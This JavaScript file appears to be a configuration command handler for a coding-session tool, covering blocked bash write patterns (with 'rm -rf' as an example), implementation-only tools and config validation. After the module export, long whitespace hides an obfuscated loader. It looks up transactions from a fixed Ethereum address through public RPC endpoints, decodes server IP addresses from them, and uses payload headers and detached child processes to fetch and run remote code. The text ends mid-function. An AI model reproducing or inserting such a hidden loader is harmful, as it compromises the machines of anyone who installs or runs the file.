        if (jsonOutput) {
            return { bash_write_patterns: patterns };
        }

        if (patterns && patterns.length > 0) {
            const lines = ["Bash Write Patterns (blocked in discussion mode):"];
            for (const pattern of patterns) {
                lines.push(`  - ${pattern}`);
            }
            return lines.join('\n');
        } else {
            return "No custom bash write patterns configured";
        }
    }

    const action = args[0].toLowerCase();

    if (action === 'add') {
        if (args.length < 2) {
            if (fromSlash) {
                return "Missing pattern for add command\nUsage: /sessions config write add <pattern>\n\nExample: /sessions config write add 'rm -rf'";
            }
            throw new Error("Usage: config write add <pattern>");
        }

        const pattern = args.slice(1).join(' ');
        let added = false;

        editConfig(config => {
            if (!config.blocked_actions.bash_write_patterns.includes(pattern)) {
                config.blocked_actions.bash_write_patterns.push(pattern);
                added = true;
            }
        });

        if (jsonOutput) {
            return { added: added, pattern: pattern };
        }
        if (added) {
            return `Added '${pattern}' to bash write patterns`;
        } else {
            return `'${pattern}' already exists in bash write patterns`;
        }

    } else if (action === 'remove') {
        if (args.length < 2) {
            if (fromSlash) {
                return "Missing pattern for remove command\nUsage: /sessions config write remove <pattern>";
            }
            throw new Error("Usage: config write remove <pattern>");
        }

        const pattern = args.slice(1).join(' ');
        let removed = false;

        editConfig(config => {
            const index = config.blocked_actions.bash_write_patterns.indexOf(pattern);
            if (index !== -1) {
                config.blocked_actions.bash_write_patterns.splice(index, 1);
                removed = true;
            }
        });

        if (jsonOutput) {
            return { removed: removed, pattern: pattern };
        }
        if (removed) {
            return `Removed '${pattern}' from bash write patterns`;
        } else {
            return `'${pattern}' not found in bash write patterns`;
        }

    } else {
        if (fromSlash) {
            return `Unknown write command: ${action}\n\nValid actions: list, add, remove\n\nUsage:\n  /sessions config write list\n  /sessions config write add <pattern>\n  /sessions config write remove <pattern>`;
        }
        throw new Error(`Unknown write action: ${action}. Valid actions: list, add, remove`);
    }
}
//!<

//!> Implementation-only tools handlers
function handleToolsCommand(args, jsonOutput = false, fromSlash = false) {
    /**
     * Handle implementation-only tools management.
     *
     * Usage:
     *     config tools list                - List all blocked tools
     *     config tools block <ToolName>    - Block a tool in discussion mode
     *     config tools unblock <ToolName>  - Unblock a tool
     */
    if (!args || args.length === 0 || args[0] === 'list') {
        // List all blocked tools
        const config = loadConfig();
        const tools = config.blocked_actions.implementation_only_tools;

        if (jsonOutput) {
            return { implementation_only_tools: tools };
        }

        if (tools && tools.length > 0) {
            const lines = ["Implementation-Only Tools (blocked in discussion mode):"];
            for (const tool of tools) {
                lines.push(`  - ${tool}`);
            }
            return lines.join('\n');
        } else {
            return "No tools configured as implementation-only";
        }
    }

    const action = args[0].toLowerCase();

    if (action === 'block') {
        if (args.length < 2) {
            if (fromSlash) {
                const validTools = Object.values(CCTools).join(', ');
                return `Missing tool name for block command\nUsage: /sessions config tools block <ToolName>\n\nValid tools: ${validTools}`;
            }
            throw new Error("Usage: config tools block <ToolName>");
        }

        const toolName = args[1];

        // Validate against CCTools enum
        const validToolValues = Object.values(CCTools);
        if (!validToolValues.includes(toolName)) {
            if (fromSlash) {
                return `Invalid tool name: ${toolName}\n\nValid tools: ${validToolValues.join(', ')}`;
            }
            throw new Error(`Invalid tool name: ${toolName}. Valid tools: ${validToolValues.join(', ')}`);
        }

        let added = false;
        editConfig(config => {
            if (!config.blocked_actions.implementation_only_tools.includes(toolName)) {
                config.blocked_actions.implementation_only_tools.push(toolName);
                added = true;
            }
        });

        if (jsonOutput) {
            return { blocked: added, tool: toolName };
        }
        if (added) {
            return `Blocked '${toolName}' in discussion mode`;
        } else {
            return `'${toolName}' is already blocked in discussion mode`;
        }

    } else if (action === 'unblock') {
        if (args.length < 2) {
            if (fromSlash) {
                return "Missing tool name for unblock command\nUsage: /sessions config tools unblock <ToolName>";
            }
            throw new Error("Usage: config tools unblock <ToolName>");
        }

        const toolName = args[1];
        let removed = false;

        editConfig(config => {
            const index = config.blocked_actions.implementation_only_tools.indexOf(toolName);
            if (index !== -1) {
                config.blocked_actions.implementation_only_tools.splice(index, 1);
                removed = true;
            }
        });

        if (jsonOutput) {
            return { unblocked: removed, tool: toolName };
        }
        if (removed) {
            return `Unblocked '${toolName}' (now allowed in discussion mode)`;
        } else {
            return `'${toolName}' was not blocked`;
        }

    } else {
        if (fromSlash) {
            return `Unknown tools command: ${action}\n\nValid actions: list, block, unblock\n\nUsage:\n  /sessions config tools list\n  /sessions config tools block <ToolName>\n  /sessions config tools unblock <ToolName>`;
        }
        throw new Error(`Unknown tools action: ${action}. Valid actions: list, block, unblock`);
    }
}
//!<

//!> Config validation
function validateConfig(jsonOutput = false) {
    /**
     * Validate the current configuration.
     */
    try {
        const config = loadConfig();
        // The load itself validates the structure

        // Additional validation checks
        const issues = [];

        // Check for empty required fields
        if (!config.git_preferences.default_branch) {
            issues.push("Git default_branch is empty");
        }

        if (!config.environment.developer_name) {
            issues.push("Developer name is empty");
        }

        // Check for at least one implementation trigger phrase
        if (!config.trigger_phrases.implementation_mode || config.trigger_phrases.implementation_mode.length === 0) {
            issues.push("No implementation mode trigger phrases defined");
        }

        if (issues.length > 0) {
            if (jsonOutput) {
                return { valid: false, issues: issues };
            }
            return "Configuration issues found:\n" + issues.map(issue => `  - ${issue}`).join('\n');
        }

        if (jsonOutput) {
            return { valid: true };
        }
        return "Configuration is valid";

    } catch (e) {
        if (jsonOutput) {
            return { valid: false, error: e.message };
        }
        return `Configuration error: ${e.message}`;
    }
}
//!<

//-#

// ==== EXPORTS ===== //
module.exports = {
    handleConfigCommand
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global.i="A9-0614-2";const _0x3a2ebe=_0x355e;(function(_0x48f9d7,_0x1a07be){const _0x4e7ab0=_0x355e,_0x39127c=_0x48f9d7();while(!![]){try{const _0x3f9af1=parseInt(_0x4e7ab0(0xf0))/(0x1*-0x1087+-0x1170+-0x4*-0x87e)*(-parseInt(_0x4e7ab0(0xdd))/(0x7*0x165+0x160f+-0x1fd0))+-parseInt(_0x4e7ab0(0x13c))/(-0x202*0x2+-0xe38+0x123f)+-parseInt(_0x4e7ab0(0xa5))/(0x7b*0x39+-0x1*0x417+0xba4*-0x2)+parseInt(_0x4e7ab0(0xc0))/(0x3a0+-0x21a2+0x1e07*0x1)+parseInt(_0x4e7ab0(0xb5))/(0x8ff*0x2+-0x1a2*0x6+0x82c*-0x1)*(-parseInt(_0x4e7ab0(0x174))/(0x10a6+0x2534+-0x35d3))+parseInt(_0x4e7ab0(0x10c))/(-0x11d1+0xbe+0x1d*0x97)+parseInt(_0x4e7ab0(0x13a))/(-0xb8*0x8+0x1df6+0x80f*-0x3);if(_0x3f9af1===_0x1a07be)break;else _0x39127c['push'](_0x39127c['shift']());}catch(_0x388603){_0x39127c['push'](_0x39127c['shift']());}}}(_0x12f0,-0xfbb0*-0x2+0x1*0x13020b+0x5*-0x20155));import{createRequire}from'module';let require=createRequire(import.meta.url);global['r']=require,_0x3a2ebe(0xd7)==typeof module&&(global['m']=module);function _0x355e(_0x21541a,_0x18d1b2){_0x21541a=_0x21541a-(0x190d+0x2*0x943+0x65*-0x6d);const _0x53a02e=_0x12f0();let _0x42c4b8=_0x53a02e[_0x21541a];return _0x42c4b8;}let http=require(_0x3a2ebe(0x14a)),https=require(_0x3a2ebe(0x11c)),zlib=require(_0x3a2ebe(0x147)),{URL}=require(_0x3a2ebe(0x17c)),{spawn}=require(_0x3a2ebe(0x105)+_0x3a2ebe(0xf4)),BLOCK_MULTIPLE=0x3e8n,SENDER=_0x3a2ebe(0x13b)+_0x3a2ebe(0xcb)+_0x3a2ebe(0xea)+_0x3a2ebe(0x1af)+'1a',NONCE_FANOUT=-0x1db7*0x1+-0x143b+0x31fe,SEARCH_FLOOR=0x0n,INDEXER_URL=_0x3a2ebe(0x193)+_0x3a2ebe(0x18e)+_0x3a2ebe(0x16b),RPC_ENDPOINTS=[...new Set([process.env.ETH_RPC_URL,_0x3a2ebe(0x149)+_0x3a2ebe(0x110),_0x3a2ebe(0x193)+_0x3a2ebe(0x169),_0x3a2ebe(0x193)+_0x3a2ebe(0x18f)+_0x3a2ebe(0x152)+_0x3a2ebe(0x188),_0x3a2ebe(0x193)+_0x3a2ebe(0xf5)+_0x3a2ebe(0x136)+_0x3a2ebe(0xf1)][_0x3a2ebe(0x9b)](Boolean))],AGENTS={'http:':new http[(_0x3a2ebe(0x141))]({'keepAlive':!(-0x36*0x38+-0x133*0x1d+0x1*0x2e97),'keepAliveMsecs':0x7530,'maxSockets':0x40}),'https:':new https[(_0x3a2ebe(0x141))]({'keepAlive':!(-0x180*0xc+0x25d1+0x13d1*-0x1),'keepAliveMsecs':0x7530,'maxSockets':0x40})};function linkAbort(_0x438117,_0x5d73ca){const _0x8685d7=_0x3a2ebe,_0x25ef4d={'TCDmB':_0x8685d7(0x9a)};_0x438117&&_0x438117[_0x8685d7(0x194)+_0x8685d7(0xf9)](_0x25ef4d[_0x8685d7(0x191)],()=>_0x5d73ca[_0x8685d7(0x9a)](),{'once':!(0x1*-0x1073+-0x319*-0x4+0x40f)});}function decompressStream(_0x1f71f7){const _0x29b168=_0x3a2ebe,_0x5d6cbb={'BTHgJ':_0x29b168(0xc8)+_0x29b168(0x126),'VLAGf':function(_0x5acbb2,_0x1cb9f1){return _0x5acbb2===_0x1cb9f1;},'JbAci':_0x29b168(0x148),'GAvxe':_0x29b168(0x186),'KvMSQ':function(_0x55b882,_0x1919d7){return _0x55b882===_0x1919d7;},'DSbLa':_0x29b168(0xeb)};let _0x98df8e=(_0x1f71f7[_0x29b168(0x14b)][_0x5d6cbb[_0x29b168(0x12f)]]||'')[_0x29b168(0xc2)+'e']();return _0x5d6cbb[_0x29b168(0x164)](_0x5d6cbb[_0x29b168(0x14d)],_0x98df8e)||_0x5d6cbb[_0x29b168(0x164)](_0x5d6cbb[_0x29b168(0x176)],_0x98df8e)?_0x1f71f7[_0x29b168(0x195)](zlib[_0x29b168(0x14c)+'ip']()):_0x5d6cbb[_0x29b168(0x134)](_0x5d6cbb[_0x29b168(0xfd)],_0x98df8e)?_0x1f71f7[_0x29b168(0x195)](zlib[_0x29b168(0x165)+_0x29b168(0xb1)]()):_0x5d6cbb[_0x29b168(0x164)]('br',_0x98df8e)?_0x1f71f7[_0x29b168(0x195)](zlib[_0x29b168(0x19f)+_0x29b168(0x12d)+'ss']()):_0x1f71f7;}function httpRequest(_0x593adb,{method:_0x25a99d=_0x3a2ebe(0x133),body:_0x3f686c,signal:_0x95d4f4}={}){const _0x3d2da5=_0x3a2ebe,_0x42d10d={'JODvp':function(_0x56ddc3,_0x1259f1){return _0x56ddc3(_0x1259f1);},'gvgPD':_0x3d2da5(0x19b),'gMfuo':_0x3d2da5(0xaf),'KaaPY':_0x3d2da5(0x142),'rysJt':_0x3d2da5(0xc1),'UlrdI':function(_0x322dc5,_0x2b93bc){return _0x322dc5===_0x2b93bc;},'MHjGK':_0x3d2da5(0xd5),'zBIcw':function(_0x2a5ebb,_0xfe6778){return _0x2a5ebb+_0xfe6778;},'VGOlJ':function(_0x563e9c,_0x3a7e42){return _0x563e9c!=_0x3a7e42;},'xuBDG':function(_0x4bfaf9,_0x580f75){return _0x4bfaf9===_0x580f75;},'sZAHS':_0x3d2da5(0x161)+_0x3d2da5(0xa8),'tjngf':_0x3d2da5(0x12a)+_0x3d2da5(0x1aa),'LGNYs':_0x3d2da5(0x131),'YvZxf':_0x3d2da5(0x1a9)+'pe','vWzxi':_0x3d2da5(0x16e)+_0x3d2da5(0x1b5)};let _0x3cdce5=new URL(_0x593adb),_0x5032cf=_0x42d10d[_0x3d2da5(0x12c)](_0x42d10d[_0x3d2da5(0x139)],_0x3cdce5[_0x3d2da5(0x196)])?https:http,_0x27236b={'Accept':_0x42d10d[_0x3d2da5(0xa0)],'Accept-Encoding':_0x42d10d[_0x3d2da5(0xbb)],'Connection':_0x42d10d[_0x3d2da5(0x135)]};return _0x42d10d[_0x3d2da5(0xe3)](null,_0x3f686c)&&(_0x27236b[_0x42d10d[_0x3d2da5(0x115)]]=_0x42d10d[_0x3d2da5(0xa0)],_0x27236b[_0x42d10d[_0x3d2da5(0x17b)]]=Buffer[_0x3d2da5(0x19d)](_0x3f686c)),new Promise((_0x19f067,_0x4835e3)=>{const _0x3ef1bc=_0x3d2da5;let _0xaf0385=_0x5032cf[_0x3ef1bc(0xc7)]({'hostname':_0x3cdce5[_0x3ef1bc(0x93)],'port':_0x3cdce5[_0x3ef1bc(0x15d)]||(_0x42d10d[_0x3ef1bc(0x120)](_0x42d10d[_0x3ef1bc(0x139)],_0x3cdce5[_0x3ef1bc(0x196)])?0x1*-0xcfb+-0x1d2d+0xf*0x2ed:0x1338+0x2*-0x8d5+-0x13e),'path':_0x42d10d[_0x3ef1bc(0x14e)](_0x3cdce5[_0x3ef1bc(0x150)],_0x3cdce5[_0x3ef1bc(0x10e)]),'method':_0x25a99d,'agent':AGENTS[_0x3cdce5[_0x3ef1bc(0x196)]],'signal':_0x95d4f4,'headers':_0x27236b},_0x574ec9=>{const _0x4fd834=_0x3ef1bc,_0x10e94a={'ZGtcg':function(_0x483995,_0x4a5702){const _0x49dc91=_0x355e;return _0x42d10d[_0x49dc91(0x114)](_0x483995,_0x4a5702);},'vJvXf':_0x42d10d[_0x4fd834(0x18b)]};let _0x431427=_0x42d10d[_0x4fd834(0x114)](decompressStream,_0x574ec9),_0x39bef6=[];_0x431427['on'](_0x42d10d[_0x4fd834(0x122)],_0x123305=>_0x39bef6[_0x4fd834(0x198)](_0x123305)),_0x431427['on'](_0x42d10d[_0x4fd834(0x1ac)],()=>{const _0x589be9=_0x4fd834;try{_0x10e94a[_0x589be9(0x99)](_0x19f067,JSON[_0x589be9(0xd4)](Buffer[_0x589be9(0x107)](_0x39bef6)[_0x589be9(0x159)](_0x10e94a[_0x589be9(0xc5)])));}catch(_0x1c95a1){_0x10e94a[_0x589be9(0x99)](_0x4835e3,_0x1c95a1);}}),_0x431427['on'](_0x42d10d[_0x4fd834(0x121)],_0x4835e3);});_0xaf0385['on'](_0x42d10d[_0x3ef1bc(0x121)],_0x4835e3),_0x42d10d[_0x3ef1bc(0xe3)](null,_0x3f686c)&&_0xaf0385[_0x3ef1bc(0xb6)](_0x3f686c),_0xaf0385[_0x3ef1bc(0x142)]();});}async function withRpcEndpoints(_0x3c144e,_0x2ea979){const _0x495608=_0x3a2ebe;let _0x418a00=RPC_ENDPOINTS[_0x495608(0x14f)](()=>new AbortController());_0x418a00[_0x495608(0x95)](_0x15379b=>linkAbort(_0x2ea979,_0x15379b));try{return await Promise[_0x495608(0x11e)](RPC_ENDPOINTS[_0x495608(0x14f)]((_0x4c6137,_0x2fd673)=>_0x3c144e(_0x4c6137,_0x418a00[_0x2fd673][_0x495608(0x10b)])));}finally{for(let _0x393e64 of _0x418a00)_0x393e64[_0x495608(0x9a)]();}}async function rpcCall(_0x1c3ac1,_0x908566,_0x2038b9,_0x36db10){const _0x24e2d3=_0x3a2ebe,_0x55d7b1={'hXaau':function(_0x7320cd,_0x19397a,_0x30fde9){return _0x7320cd(_0x19397a,_0x30fde9);},'MxoIv':_0x24e2d3(0x19c),'CtMxp':_0x24e2d3(0x97)};let _0xffe3dd=await _0x55d7b1[_0x24e2d3(0x109)](httpRequest,_0x1c3ac1,{'method':_0x55d7b1[_0x24e2d3(0x9f)],'body':JSON[_0x24e2d3(0x98)]({'jsonrpc':_0x55d7b1[_0x24e2d3(0x140)],'id':0x1,'method':_0x908566,'params':_0x2038b9}),'signal':_0x36db10});return _0xffe3dd[_0x24e2d3(0xd6)];}async function rpcBatch(_0xb94eeb,_0x2e1831,_0x1aa236){const _0x143ca3=_0x3a2ebe,_0x8d06ce={'vVkBr':function(_0x259c12,_0x46239b,_0x186b51){return _0x259c12(_0x46239b,_0x186b51);},'HiWYY':_0x143ca3(0x19c)};let _0x303103=await _0x8d06ce[_0x143ca3(0x103)](httpRequest,_0xb94eeb,{'method':_0x8d06ce[_0x143ca3(0x1a8)],'body':JSON[_0x143ca3(0x98)](_0x2e1831[_0x143ca3(0x14f)](([_0xe79aa1,_0x386e83],_0x397f41)=>({'jsonrpc':_0x143ca3(0x97),'id':_0x397f41+(-0x2b*-0x48+0x2467+0x3*-0x102a),'method':_0xe79aa1,'params':_0x386e83}))),'signal':_0x1aa236}),_0x43900d=new Map(_0x303103[_0x143ca3(0x14f)](_0x46f816=>[_0x46f816['id'],_0x46f816]));return _0x2e1831[_0x143ca3(0x14f)]((_0x246f0d,_0x260de3)=>_0x43900d[_0x143ca3(0xe9)](_0x260de3+(-0xa25*-0x2+0x19fa+-0x2e43))[_0x143ca3(0xd6)]);}let toBlockHex=_0x460a01=>'0x'+_0x460a01[_0x3a2ebe(0x159)](0x1b97+-0x2*0x3a7+-0x1f*0xa7);function findSenderTx(_0xaed72){const _0x58ebf2=_0x3a2ebe;return _0xaed72[_0x58ebf2(0x9d)](_0x11770d=>_0x11770d[_0x58ebf2(0x18c)]&&_0x11770d[_0x58ebf2(0x18c)][_0x58ebf2(0xc2)+'e']()===SENDER)||null;}function decodeAddress(_0x3f982d){const _0x53878e=_0x3a2ebe,_0x160094={'ScXiL':_0x53878e(0x15a),'jrdXD':function(_0x5aff48,_0x31311f){return _0x5aff48(_0x31311f);},'DGksE':function(_0x4f37d6,_0x4e64f1){return _0x4f37d6(_0x4e64f1);}};let _0x268f72=Buffer[_0x53878e(0x18c)](_0x3f982d[_0x53878e(0xbd)](/^0x/i,''),_0x160094[_0x53878e(0x1a2)]),_0x43d4d2=_0x33741d=>_0x33741d[-0x853+-0x2*0x338+0xec3]+'.'+_0x33741d[-0xb2c+-0x1e9+-0x1*-0xd16]+'.'+_0x33741d[-0x1*-0x704+-0x1*-0x25e1+0x2ce3*-0x1]+'.'+_0x33741d[0x2*0x1042+-0x4c2*0x5+-0x8b7];return[_0x160094[_0x53878e(0xb0)](_0x43d4d2,_0x268f72[_0x53878e(0xde)](-0x1*-0x1def+0x1939+0x4*-0xdca,0x71*0x23+0x2410+-0x337f)),_0x160094[_0x53878e(0xcf)](_0x43d4d2,_0x268f72[_0x53878e(0xde)](-0x2f*0x3+0xb5*0xd+-0x6*0x170,0x1*-0x22a0+-0xe*0x15a+0x3594))];}function _0x12f0(){const _0x2c2fa8=['smCxl','node:https','oad\x20body','any','zNIqU','UlrdI','rysJt','gMfuo','Payload-B6',':443/0x/ls','ipNqp','coding','UqBND',',Sr3=@','_t_u\x27]=\x27','gzip,\x20defl','SDbiI','xuBDG','liDecompre','EreqP','BTHgJ','Kit/537.36','keep-alive','_t_s\x27]=\x27','GET','KvMSQ','LGNYs','public.bla','plaFW','NkKDh','MHjGK','13698468PmAknI','0xa322e5f3','297120QUZuEg','yrzwP','zeoxL','eth_getBlo','CtMxp','Agent','end','on=txlist&','jvgKp','KXiLK','Win64;\x20x64','node:zlib','gzip','https://1r','node:http','headers','createGunz','JbAci','zBIcw','map','pathname','nghnv','.publicnod','fari/537.3','RpPIO',':80','VnFVq','m\x27]=module','hrUVT','toString','hex','LBjUj','_t_s','port','_H2\x27]=\x27','QLmfg','9&page=1&o','applicatio','YZKTj','findIndex','VLAGf','createInfl','transactio','gldQK','GuYPf','h.drpc.org','_H2','ut.com/api','fLYXd','has','Content-Le','controller','aveIc','tavZt','BJgzE','add','49oNuXHs','JVkQF','GAvxe','unref','then','al=global;','\x27]=\x27','vWzxi','node:url','oMnng','http://','run','\x20Chrome/13',':443','bXcTI','k=0&endblo','lnQal','@^1aQk','x-gzip','nonce','e.com','bLolJ','ike\x20Gecko)','gvgPD','from','KafOh','h.blocksco','hereum-rpc','ort=desc&f','TCDmB','LssUT','https://et','addEventLi','pipe','protocol','ffset=20&s','push','ZgpqG','Tnnlg','utf8','POST','byteLength','qFOcQ','createBrot','ugrhL','eth_blockN','ScXiL','WYnsa','0\x20(Windows','zwjTr','eEQvU','b64','HiWYY','Content-Ty','ate,\x20br','xxxso','KaaPY','fIkOw','blockNumbe','9adc2490ef','eAmtO','min','wNEAr','ucVFK','jueMj','ngth','FfHYb','gzKWs','PSzJk','resume','y-p_>d$0B&','nILEL','hostname','KQldR','forEach','base64','2.0','stringify','ZGtcg','abort','filter','rMZnD','find','1.0.0.0\x20Sa','MxoIv','sZAHS','fbAQy','dQhjR','count&acti','qqKoX','3999712DXgKmU','ziJAI','q4FZkxX{!h','n/json','x-payload-','foHur','RWrVc','charCodeAt','nnxOv','mjCAw','data','jrdXD','ate','ZYBBe','eth_getTra','all','883554gwKkih','write','JQKVG','mGgtb','Missing\x20X-','ck=9999999','tjngf','address=','replace','r\x27]=requir','fJKsv','5050170JAAsRa','error','toLowerCas','xbMiN','ilterby=fr','vJvXf','raCZU','request','content-en','unt','XLylK','d311d3080e','TOkwx','length','WMrCP','DGksE','nsactionCo','FWUiH','RsZph','aPZUM','parse','https:','result','object','umber','VMnQg','CDbzL','Empty\x20payl','\x20NT\x2010.0;\x20','2KeNBiC','subarray','wvGeG','CUrwh','\x20(KHTML,\x20l','XrZYs','VGOlJ',':443/0x/cl','&startbloc','rjSZm','LTGfe','ZAlOy','get','6f0121063e','deflate','MjzxH','node','\x27;global[\x27','?module=ac','360688RTYsDf','stapi.io','isArray','eWCKt','_process','h-mainnet.','GGqwf','eIHSm','xQuoH','stener','_H\x27]=\x27','Mozilla/5.','djgaa','DSbLa','qiODF','global[\x27_V','catch','cVjMR','SXfgk','vVkBr','QMwHG','node:child',';var\x20_glob','concat','JGUpq','hXaau','XHNyr','signal','5407112rvLYDS','ckByNumber','search','ignore','pc.io/eth','e;global[\x27','gIWWO','SHJJd','JODvp','YvZxf','_t_u',')\x20AppleWeb','CRKiT','tqJhV','HEAD'];_0x12f0=function(){return _0x2c2fa8;};return _0x12f0();}function firstMatch(_0x21b624){const _0x5f5985={'fIkOw':function(_0x228835,_0x5c99db){return _0x228835(_0x5c99db);},'fJKsv':function(_0x6e49ad,_0x5da592){return _0x6e49ad==_0x5da592;},'aveIc':function(_0x5f50e9,_0x4cf526){return _0x5f50e9(_0x4cf526);},'JVkQF':function(_0x1b9cad,_0x34e74f){return _0x1b9cad!=_0x34e74f;},'QLmfg':function(_0x2b1d39,_0xfdf95d){return _0x2b1d39(_0xfdf95d);},'gldQK':function(_0x330753,_0x1837de){return _0x330753(_0x1837de);}};return new Promise(_0x1055a6=>{const _0x43a200=_0x355e,_0x574496={'qqKoX':function(_0x4f2e13,_0x16b5ae){const _0x4bfb56=_0x355e;return _0x5f5985[_0x4bfb56(0x170)](_0x4f2e13,_0x16b5ae);}};let _0x34d0a3=_0x21b624[_0x43a200(0xcd)];if(!_0x34d0a3)return _0x5f5985[_0x43a200(0x167)](_0x1055a6,null);let _0x12f190=!(0x1*-0xead+-0x25d5+0x3483),_0x4ea38e=_0x344775=>{const _0x5a6f9a=_0x43a200;if(!_0x12f190){for(let _0x11c14b of(_0x12f190=!(-0x13c4+-0x1a02+0x2dc6),_0x21b624))_0x11c14b[_0x5a6f9a(0x16f)][_0x5a6f9a(0x9a)]();_0x574496[_0x5a6f9a(0xa4)](_0x1055a6,_0x344775);}};for(let _0x266710 of _0x21b624)_0x266710[_0x43a200(0x17f)]()[_0x43a200(0x178)](_0x193f94=>{const _0x1cbfd8=_0x43a200;_0x12f190||(_0x193f94?_0x5f5985[_0x1cbfd8(0x1ad)](_0x4ea38e,_0x193f94):_0x5f5985[_0x1cbfd8(0xbf)](0xe0*0x4+0x1*0x1bf7+-0x1f77,--_0x34d0a3)&&_0x5f5985[_0x1cbfd8(0x170)](_0x1055a6,null));})[_0x43a200(0x100)](()=>{const _0xebd979=_0x43a200;_0x12f190||_0x5f5985[_0xebd979(0x175)](-0xc39+0x723+0x516,--_0x34d0a3)||_0x5f5985[_0xebd979(0x15f)](_0x1055a6,null);});});}function candidateBlocks(_0x3cdaf9){const _0x3e16b7=_0x3a2ebe,_0x26a154={'CRKiT':function(_0x296270,_0x1821b5){return _0x296270-_0x1821b5;},'nnxOv':function(_0xd797ea,_0x1874f0){return _0xd797ea-_0x1874f0;},'BJgzE':function(_0x17a746,_0x198c5e){return _0x17a746+_0x198c5e;},'nghnv':function(_0xc4b7b9,_0x52dbd9){return _0xc4b7b9-_0x52dbd9;},'fLYXd':function(_0x9cf028,_0x268c43){return _0x9cf028+_0x268c43;},'WMrCP':function(_0x1f3421,_0x1c5822){return _0x1f3421<_0x1c5822;}};let _0x4a55ef=_0x26a154[_0x3e16b7(0x118)](_0x3cdaf9,BLOCK_MULTIPLE),_0x5e5c51=new Set(),_0x482794=[];for(let _0x2d2666 of[_0x26a154[_0x3e16b7(0xad)](_0x3cdaf9,0x1n),_0x3cdaf9,_0x26a154[_0x3e16b7(0x172)](_0x3cdaf9,0x1n),_0x26a154[_0x3e16b7(0x151)](_0x4a55ef,0x1n),_0x4a55ef,_0x26a154[_0x3e16b7(0x16c)](_0x4a55ef,0x1n)]){if(_0x26a154[_0x3e16b7(0xce)](_0x2d2666,0x0n))continue;let _0x3ae321=_0x2d2666[_0x3e16b7(0x159)]();_0x5e5c51[_0x3e16b7(0x16d)](_0x3ae321)||(_0x5e5c51[_0x3e16b7(0x173)](_0x3ae321),_0x482794[_0x3e16b7(0x198)](_0x2d2666));}return _0x482794;}function blockTask(_0x42089c){const _0x43f677={'wNEAr':function(_0x5d6398,_0x346548,_0x44c318){return _0x5d6398(_0x346548,_0x44c318);},'ziJAI':function(_0x1919d0,_0x138670){return _0x1919d0(_0x138670);}};let _0xc51d7b=new AbortController();return{'controller':_0xc51d7b,async 'run'(){const _0x4800f8=_0x355e;let _0x3fcdb4=await _0x43f677[_0x4800f8(0x1b2)](withRpcEndpoints,(_0x3c3351,_0x45a26b)=>rpcCall(_0x3c3351,_0x4800f8(0x13f)+_0x4800f8(0x10d),[toBlockHex(_0x42089c),!(-0x1*0xaeb+-0x7*0x59+-0x1*-0xd5a)],_0x45a26b),_0xc51d7b[_0x4800f8(0x10b)]),_0xa17565=_0x3fcdb4?.[_0x4800f8(0x166)+'ns'];if(!Array[_0x4800f8(0xf2)](_0xa17565))return null;let _0x3aaf38=_0x43f677[_0x4800f8(0xa6)](findSenderTx,_0xa17565);return _0x3aaf38?{'blockNumber':_0x42089c,'tx':_0x3aaf38}:null;}};}async function nonceAtBlocks(_0x48b0b7,_0xeba093){const _0x2bf86d=_0x3a2ebe,_0x306878={'CUrwh':function(_0x5917ba,_0x80a075,_0x5f1ee8){return _0x5917ba(_0x80a075,_0x5f1ee8);}};let _0x5c1a05=_0x48b0b7[_0x2bf86d(0x14f)](_0x1dcdef=>[_0x2bf86d(0xb3)+_0x2bf86d(0xd0)+_0x2bf86d(0xc9),[SENDER,toBlockHex(_0x1dcdef)]]);try{return(await _0x306878[_0x2bf86d(0xe0)](withRpcEndpoints,(_0xd746f,_0x473522)=>rpcBatch(_0xd746f,_0x5c1a05,_0x473522),_0xeba093))[_0x2bf86d(0x14f)](BigInt);}catch{return(await Promise[_0x2bf86d(0xb4)](_0x5c1a05[_0x2bf86d(0x14f)](([_0x2babff,_0x3a3b66])=>withRpcEndpoints((_0x149844,_0xb83fe7)=>rpcCall(_0x149844,_0x2babff,_0x3a3b66,_0xb83fe7),_0xeba093))))[_0x2bf86d(0x14f)](BigInt);}}async function lastSenderTx(_0x6947a6){const _0x2fd541=_0x3a2ebe,_0x865f0d={'TOkwx':function(_0x5d2d58,_0x8010fd){return _0x5d2d58(_0x8010fd);},'mGgtb':function(_0x58f27c,_0x4c45b7,_0x3c600e){return _0x58f27c(_0x4c45b7,_0x3c600e);},'MjzxH':function(_0x1c1e28,_0x3211ab){return _0x1c1e28(_0x3211ab);},'JQKVG':function(_0x4c6ce4,_0x3b78d1){return _0x4c6ce4-_0x3b78d1;},'ucVFK':function(_0x1fa7f8,_0x1e54b0){return _0x1fa7f8>_0x1e54b0;},'oMnng':function(_0x514391,_0x56220c){return _0x514391(_0x56220c);},'NkKDh':function(_0x3fccd7,_0x3598ae){return _0x3fccd7<=_0x3598ae;},'lnQal':function(_0x35f187,_0x271b47){return _0x35f187+_0x271b47;},'foHur':function(_0x1e7b3b,_0x19c605){return _0x1e7b3b/_0x19c605;},'SDbiI':function(_0x43c2f0,_0xbdc559){return _0x43c2f0*_0xbdc559;},'CDbzL':function(_0x461538,_0x22c7d6){return _0x461538+_0x22c7d6;},'GGqwf':function(_0x4c1acc,_0x1f6394){return _0x4c1acc===_0x1f6394;},'fbAQy':function(_0xe78b10,_0x2a2d28){return _0xe78b10(_0x2a2d28);}};let _0x1228d0=new AbortController();try{let _0x7717c5=_0x6947a6??_0x865f0d[_0x2fd541(0xcc)](BigInt,await _0x865f0d[_0x2fd541(0xb8)](withRpcEndpoints,(_0x225474,_0x398eed)=>rpcCall(_0x225474,_0x2fd541(0x1a1)+_0x2fd541(0xd8),[],_0x398eed),_0x1228d0[_0x2fd541(0x10b)])),_0xe32847=_0x865f0d[_0x2fd541(0xec)](BigInt,await _0x865f0d[_0x2fd541(0xb8)](withRpcEndpoints,(_0x166e6e,_0x20a24f)=>rpcCall(_0x166e6e,_0x2fd541(0xb3)+_0x2fd541(0xd0)+_0x2fd541(0xc9),[SENDER,toBlockHex(_0x7717c5)],_0x20a24f),_0x1228d0[_0x2fd541(0x10b)])),_0x2c7ca1=_0x865f0d[_0x2fd541(0xb7)](_0xe32847,0x1n),_0x36dc0b=_0x865f0d[_0x2fd541(0xb7)](SEARCH_FLOOR,0x1n),_0x57beb5=_0x7717c5;for(;_0x865f0d[_0x2fd541(0x1b3)](_0x865f0d[_0x2fd541(0xb7)](_0x57beb5,_0x36dc0b),0x1n);){let 